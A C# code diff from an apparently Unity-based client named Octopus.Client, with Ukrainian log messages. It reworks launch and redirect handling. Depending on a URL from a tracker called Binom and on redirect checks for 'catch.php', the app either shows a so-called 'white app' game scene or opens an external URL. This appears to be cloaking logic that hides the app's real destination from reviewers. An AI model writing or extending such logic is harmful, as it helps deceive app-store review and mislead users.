@@ -40,26 +40,23 @@ namespace Octopus.Client
             {
                 PrintMessage("!!! Client - Повторно запустили додаток");
                 
-                if (CheckReceiveUrlIsNullOrEmpty())
-                {
-                    PrintMessage("!!! Client -  Стартова сторінка з Бінома є порожня, показуєм білу апку");
-                    
-                    SwitchToScene();
-                }
-                else
-                {
-                    PrintMessage("!!! Client - Біном не є порожній");
+                PrintMessage(CheckReceiveUrlIsNullOrEmpty()
+                    ? "!!! Client -  Стартова сторінка з Бінома є порожня, показуєм білу апку"
+                    : "!!! Client - Біном не є порожній");
 
-                    SwitchToScene();
-                }
+                SwitchToScene();
             }
             else 
             {
                 PrintMessage("!!! Client - Перший раз запустили додаток");
                 
                 GameSettings.Init();
+                
+                requests.Add(new InitRequest());
+                
+                Send(requests[0]);
 
-                OpenURL();
+                //OpenURL();
             }
         }
 
@@ -82,7 +79,19 @@ namespace Octopus.Client
             }
             else
             {
-                SwitchToScene();
+                PrintMessage($"SecondRedirectUrl: {GameSettings.GetValue(Constants.SecondRedirectUrl)}");
+                
+                if (CheckReceiveUrlIsNullOrEmpty())
+                {
+                    if (SceneLoader.Instance)
+                        SceneLoader.Instance.SwitchToScene(SceneLoader.Instance.mainScene);
+                    else
+                        SceneManager.LoadScene(SceneLoader.Instance.mainScene);
+                }
+                else
+                {
+                    OpenURL();
+                }
             }
         }
         
@@ -144,6 +153,8 @@ namespace Octopus.Client
         private void GenerateURL()
         {
             generatedURL = $"{Settings.GetAttributionUrl()}";
+
+            generatedURL = GameSettings.GetValue(Constants.ReceiveUrl);
             
             PrintMessage($"📌 generatedURL: {generatedURL}");
         }
@@ -175,17 +186,17 @@ namespace Octopus.Client
                 redirectCount++;
                 
                 // 🔍 Перевірка першого редіректа (тобто redirectCount == 2)
-                if (redirectCount == 2)
+                if (redirectCount == 1)
                 {
                     if (request.Url.Contains("catch.php"))
                     {
-                        PrintMessage($"🎯 Після 1-го редіректа посилання містить 'catch.php': {request.Url}");
+                        PrintMessage($"🎯 Після {redirectCount}-го редіректа посилання містить 'catch.php': {request.Url}");
                         
                         wasCatchDetected = false;
                     }
                     else
                     {
-                        PrintMessage($"⚠️ Після 1-го редіректа — але БЕЗ 'catch.php': {request.Url}");
+                        PrintMessage($"⚠️ Після {redirectCount}-го редіректа — але БЕЗ 'catch.php': {request.Url}");
                         
                         wasCatchDetected = true;
                         
@@ -194,13 +205,17 @@ namespace Octopus.Client
                 }
                 
                 // 🔍 Перевірка другого редіректа (тобто redirectCount == 3)
-                if (redirectCount == 3)
+                if (redirectCount == 2)
                 {
                     secondRedirectUrl = request.Url;
                     
-                    PrintMessage($"✅ Збережено URL після 2-го редіректа: {secondRedirectUrl}");
+                    PrintMessage($"✅ Збережено URL після {redirectCount}-го редіректа: {secondRedirectUrl}");
                     
-                    var uriDomen = new Uri(Settings.GetAttributionUrl());
+                    var uriDomen = new Uri(Settings.GetDomain());
+
+                    PrintMessage($"request.Url: {request.Url}");
+                    PrintMessage($"uriDomen: {uriDomen.Host.ToLower()}");
+                    PrintMessage($"GetAttributionUrl: {Settings.GetDomain()}");
                     
                     if (request.Url.Contains(uriDomen.Host.ToLower()))
                     {
